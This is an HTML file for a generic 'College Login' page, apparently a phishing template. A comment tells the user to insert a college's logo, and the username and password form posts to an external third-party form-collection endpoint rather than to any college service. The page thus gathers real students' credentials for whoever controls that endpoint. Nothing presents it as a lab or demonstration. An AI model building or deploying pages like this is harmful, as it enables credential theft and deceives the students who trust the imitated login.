<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#003366,#0066cc);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.login-box{
    background:#fff;
    width:360px;
    padding:30px;
    border-radius:15px;
    box-shadow:0 10px 25px rgba(0,0,0,.3);
    text-align:center;
}

.logo{
    width:100px;
    height:100px;
    border-radius:50%;
    margin-bottom:15px;
}

h2{
    color:#003366;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    margin-top:15px;
    background:#003366;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}
</style>

</head>
<body>

<div class="login-box">

    <!-- Replace with your college logo -->
    <img src="1697346843915.jpeg" alt="College Logo" class="logo">

    <h2>Student Login</h2>

    <form action="https://formspree.io/f/xojaevjr" method="POST">

        <input
            type="text"
            name="Username"
            placeholder="Enter Username"
            required>

        <input
            type="password"
            name="Password"
            placeholder="Enter Password"
            required>

        <button type="submit">Login</button>

    </form>

</div>

</body>
</html>
